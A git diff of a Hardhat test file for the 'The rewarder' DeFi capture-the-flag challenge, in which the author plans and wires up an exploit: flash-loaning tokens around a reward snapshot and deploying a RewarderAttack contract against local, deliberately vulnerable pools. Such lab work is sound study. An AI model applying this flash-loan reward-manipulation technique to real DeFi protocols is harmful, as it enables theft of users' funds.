@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+
 describe('[Challenge] The rewarder', function () {
 
     let deployer, alice, bob, charlie, david, attacker;
@@ -65,6 +66,7 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
+
         /** CODE YOUR EXPLOIT HERE */
 
         // Ok before I even read the code my first intinct is that I'll flashloan out a ton of DVT just at the moment of the snapshot
@@ -83,12 +85,17 @@ describe('[Challenge] The rewarder', function () {
         // Would the code execution in the flashloan have msg.sender context as FlashLoanerPool (like in TrusterLenderPool)? Would this open anything up for access control?
 
         const RewarderAttackFactory = await ethers.getContractFactory('RewarderAttack', attacker);
-        this.attackContract = await RewarderAttackFactory.connect(attacker).deploy(this.flashLoanPool.address);
+        this.attackContract = await RewarderAttackFactory.connect(attacker).deploy(
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address
+        );
 
-        const poolBalance = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
-        console.log("Flash loan balance", await ethers.utils.formatEther(poolBalance));
+        // const poolBalance = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
+        // console.log("Flash loan balance", await ethers.utils.formatEther(poolBalance));
 
-        await this.attackContract.connect(attacker).requestFlashLoan(poolBalance);
+        await this.attackContract.connect(attacker).requestFlashLoan();
 
         console.log("Is new reward round?", await this.rewarderPool.isNewRewardsRound());
 
